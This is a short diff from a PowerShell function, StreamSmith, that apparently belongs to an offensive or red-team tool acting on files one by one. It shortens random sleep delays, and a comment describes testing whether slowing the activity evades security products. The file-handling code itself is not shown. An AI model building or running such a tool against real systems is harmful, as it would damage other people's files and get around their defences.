@@ -269,11 +269,11 @@ function StreamSmith{
                                 Write-Host "The Byte got ahold of $file"
                                 # so initally I had no sleep condition in here and I was getting smacked harder than a lawn chair in a hurricane, but I thought what if I slowed the process down a bit would the
                                 # security products I tested against still block the activity? The answer was no, they don't care if it looks slow. Kinda neat
-                            Start-Sleep(Get-Random -Minimum 0 -Maximum 10)
+                            Start-Sleep(Get-Random -Minimum 0 -Maximum 5)
                         }
                         catch {
                         Write-Host "$file escaped Diddy"
-                        Start-Sleep(Get-Random -Minimum 0 -Maximum 10)
+                        Start-Sleep(Get-Random -Minimum 0 -Maximum 5)
                         }
 
 
